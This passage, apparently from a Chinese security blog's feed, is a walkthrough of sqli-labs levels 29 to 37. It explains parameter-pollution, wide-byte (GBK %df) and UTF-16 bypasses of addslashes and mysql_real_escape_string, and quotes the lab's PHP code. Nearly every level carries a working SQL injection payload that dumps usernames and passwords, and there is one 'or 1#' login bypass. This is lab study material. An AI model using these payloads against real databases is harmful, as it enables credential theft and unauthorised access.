class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>这个 index.php 太简单了，不知道啥意思，下面直接重点来看 login.php 吧：</p><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># 查询 query 的字符串</span><span class="hljs-variable">$qs</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<span class="hljs-comment"># 模拟 tomcat 的查询函数 处理一下</span><span class="hljs-variable">$id1</span>=java_implimentation(<span class="hljs-variable">$qs</span>);<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-comment"># 再次过滤检测</span>whitelist(<span class="hljs-variable">$id1</span>);<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> 查询到结果:    输出查询的详细信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());<span class="hljs-meta">?&gt;</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params"><span class="hljs-variable">$query_string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$q_s</span> = <span class="hljs-variable">$query_string</span>;    <span class="hljs-comment"># &amp; 作为分隔符 分割字符串</span>    <span class="hljs-variable">$qs_array</span>= explode(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-variable">$q_s</span>);    <span class="hljs-comment"># 遍历 qs_array 数组</span>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$qs_array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)    &#123;            <span class="hljs-variable">$val</span>=substr(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);        <span class="hljs-comment"># 如果数组前两位是 id 的话</span>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$val</span>==<span class="hljs-string">&quot;id&quot;</span>)        &#123;                <span class="hljs-comment"># 截取 $value 的3-30 的字符串 作为 id 的值 </span>            <span class="hljs-variable">$id_value</span>=substr(<span class="hljs-variable">$value</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>);             <span class="hljs-keyword">return</span> <span class="hljs-variable">$id_value</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;            <span class="hljs-keyword">break</span>;        &#125;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-comment"># 过滤规则 检测数字</span>    <span class="hljs-variable">$match</span> = preg_match(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, <span class="hljs-variable">$input</span>);    <span class="hljs-keyword">if</span> 不符合规则：        header(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);&#125;</code></pre><p>从代码中还是很容易发现问题的，关键问题出在下面的地方：</p><pre><code class="hljs Php"><span class="hljs-variable">$id1</span>=java_implimentation(<span class="hljs-variable">$qs</span>);...whitelist(<span class="hljs-variable">$id1</span>);</code></pre><p><code>whitelist</code> 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 <code>hacked.php</code>，这里是没毛病的。那么问题出在了这里函数<code>$id1=java_implimentation($qs);</code></p><p>因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 <code>return $id_value</code>，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</p><p>假设用户输入这样的语句：</p><pre><code class="hljs Php">index.php?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">2</span></code></pre><p>Apache PHP 会解析最后一个参数</p><p>Tomcat JSP 会解析第一个参数</p><p>知道这个原理的话后面尝试直接注入吧：</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-32-宽字节注入"><a href="#Less-32-宽字节注入" class="headerlink" title="Less-32(宽字节注入)"></a>Less-32(宽字节注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>考察 Bypass addslashes()，关键的防护代码如下：</p><pre><code class="hljs Php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<span class="hljs-variable">$id</span>=check_addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-comment"># 在&#x27; &quot; \ 等敏感字符前面添加反斜杠</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;        <span class="hljs-comment"># \ 转换为 \\</span>    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/&#x27;</span>. preg_quote(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);          将       <span class="hljs-comment"># 将 &#x27; 转为\&quot;</span>    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/\&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>, <span class="hljs-variable">$string</span>);         <span class="hljs-comment"># 将 &quot; 转为\&quot;</span>    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/\&quot;/&#x27;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, <span class="hljs-variable">$string</span>);                                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p><strong>宽字节注入原理</strong></p><p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 <code>%aa%5c</code> 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 <code>\</code>，所以这里想办法干掉反斜杠即可。</p><p>1、<code>%df</code> 吃掉 <code>\</code></p><p>具体的原因是 <code>urlencode(\&#39;) = %5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形 成<code>%df%5c%27</code>，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把<code>%df%5c</code> 当做是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><p>2、将 <code>\&#39;</code> 中的 <code>\</code> 过滤掉</p><p>例如可以构造 <code>%5c%5c%27</code> 的情况，后面的<code>%5c</code>会被前面的<code>%5c</code> 给注释掉。这也是 bypass 的一种方法。</p><p>本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：</p><pre><code class="hljs sql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>拼接方式也是一样的，过滤方法细节有点变化，具体如下：</p><pre><code class="hljs Php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$string</span>= addslashes(<span class="hljs-variable">$string</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串。</p><table><thead><tr><th>预定义字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。</p><blockquote><p>注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p></blockquote><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>过滤方法依然和 Less-33 一致：</p><pre><code class="hljs php"><span class="hljs-variable">$uname</span> = addslashes(<span class="hljs-variable">$uname1</span>);<span class="hljs-variable">$passwd</span>= addslashes(<span class="hljs-variable">$passwd1</span>);</code></pre><p>只是由 GET 型变成了 POST 型，所以下面直接丢 POST 的数据包 payload 了：</p><pre><code class="hljs sql">uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=admin</span></code></pre><p>MySQL 注入天书这里介绍了一个新的方法</p><p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>&#39;</code> 转为 utf-16 为<code>�</code></p><p>我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p><pre><code class="hljs Bash">➜  ~ <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27;|iconv -f utf-8 -t utf-16</span><span class="hljs-string">��&#x27;</span>➜  ~ <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27;|iconv -f utf-8 -t utf-32</span><span class="hljs-string">��&#x27;</span></code></pre><p>首先尝试一个经典的万能密码：</p><pre><code class="hljs Payload">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;</code></pre><p>为什么这个万能密码可以生效呢，因为拼接到 SQL 中是如下的效果：</p><pre><code class="hljs Sql"><span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;�&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-comment">#and password=&#x27;$passwd&#x27; LIMIT 0,1</span></code></pre><p><code>or 1</code> 是一个永真的条件，不论 select 选择出的内容是什么。<code>or 1</code> 之后时钟都是 1，下面是控制后台的演示：</p><pre><code class="hljs Bash"><span class="hljs-comment"># where username = &#x27;x&#x27; or 1</span>mysql&gt;  select * from users <span class="hljs-built_in">where</span> username = <span class="hljs-string">&#x27;x&#x27;</span> or 1;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb       | 0        ||  2 | Angelina   | 0        ||  3 | Dummy      | 0        ||  4 | secure     | 0        ||  5 | stupid     | 0        ||  6 | superman   | 0        ||  7 | batman     | 0        ||  8 | admin      | 1234     ||  9 | admin1     | 0        || 10 | admin2     | 0        || 11 | admin3     | 0        || 12 | dhakkan    | 0        || 14 | admin4     | 0        || 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">14 rows in set (0.00 sec)</span><span class="hljs-string"></span><span class="hljs-string"># where username = &#x27;</span>x<span class="hljs-string">&#x27; or 0</span><span class="hljs-string">mysql&gt;  select * from users where username = &#x27;</span>x<span class="hljs-string">&#x27; or 0;</span><span class="hljs-string">Empty set (0.00 sec)</span><span class="hljs-string"></span><span class="hljs-string"># where 1</span><span class="hljs-string">mysql&gt;  select * from users where 1;</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">| id | username   | password |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">|  1 | Dumb       | 0        |</span><span class="hljs-string">|  2 | Angelina   | 0        |</span><span class="hljs-string">|  3 | Dummy      | 0        |</span><span class="hljs-string">|  4 | secure     | 0        |</span><span class="hljs-string">|  5 | stupid     | 0        |</span><span class="hljs-string">|  6 | superman   | 0        |</span><span class="hljs-string">|  7 | batman     | 0        |</span><span class="hljs-string">|  8 | admin      | 1234     |</span><span class="hljs-string">|  9 | admin1     | 0        |</span><span class="hljs-string">| 10 | admin2     | 0        |</span><span class="hljs-string">| 11 | admin3     | 0        |</span><span class="hljs-string">| 12 | dhakkan    | 0        |</span><span class="hljs-string">| 14 | admin4     | 0        |</span><span class="hljs-string">| 15 | admin&#x27;</span><span class="hljs-comment">#sec | 123      |</span>+----+------------+----------+14 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<span class="hljs-comment"># where 0</span>mysql&gt; select * from users <span class="hljs-built_in">where</span> 0;Empty <span class="hljs-built_in">set</span> (0.00 sec)</code></pre><p>那么直接尝试一下最基本的联合查询注入看看：</p><pre><code class="hljs sql">uname=�&#x27; and 1=2 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span></code></pre><p>也是 OK 的</p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>Less-35 的防护措施有点搞笑，首先 id 使用了如下规则过滤：</p><pre><code class="hljs Php"><span class="hljs-variable">$id</span>=check_addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$string</span> = addslashes(<span class="hljs-variable">$string</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p>但是本关的拼接方式是：</p><pre><code class="hljs Bash"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-variable">$id</span> LIMIT 0,1&quot;</span>;</code></pre><p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：</p><pre><code class="hljs sql">?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-36-Bypass-mysql-real-escape-string"><a href="#Less-36-Bypass-mysql-real-escape-string" class="headerlink" title="Less-36(Bypass mysql_real_escape_string)"></a>Less-36(Bypass mysql_real_escape_string)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>主要防护代码：</p><pre><code class="hljs Php"><span class="hljs-variable">$id</span>=check_quotes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_quotes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$string</span>= mysql_real_escape_string(<span class="hljs-variable">$string</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p>这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>这一关使用 Less-34 关的两种思路依然是可行的，下面直接尝试 payload 进行注入吧：</p><pre><code class="hljs sql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+ </span></code></pre><p>或者</p><pre><code class="hljs sql">?id=-1�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+ </span></code></pre><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>依然使用了 和 Less-36 的防护方法：</p><pre><code class="hljs Php"><span class="hljs-variable">$uname</span> = mysql_real_escape_string(<span class="hljs-variable">$uname1</span>);<span class="hljs-variable">$passwd</span>= mysql_real_escape_string(<span class="hljs-variable">$passwd1</span>);</code></pre><p>所以利用思路也是一毛一样的，只是由 GET 型变成了 POST 型了，下面就直接尝试注入吧：</p><pre><code class="hljs sql">uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=admin</span></code></pre><p>或者：</p><pre><code class="hljs sql">uname=�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;高级注入姿势-21-37-关&quot;&gt;&lt;a href=&quot;#高级注入姿势-21-37-关&quot; class=&quot;headerlink&quot; title=&quot;高级注入姿势 21-37 关&quot;&gt;&lt;/a&gt;高级注入姿势 21-37 关&lt;/h1&gt;&lt;h2 id=&quot;Less-21-Cookie-Ba</summary>
      
    
    
    
    <category term="WEB安全" scheme="http://www.secice.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli lab" scheme="http://www.secice.cn/tags/sqli-lab/"/>
    
  </entry>
  
</feed>
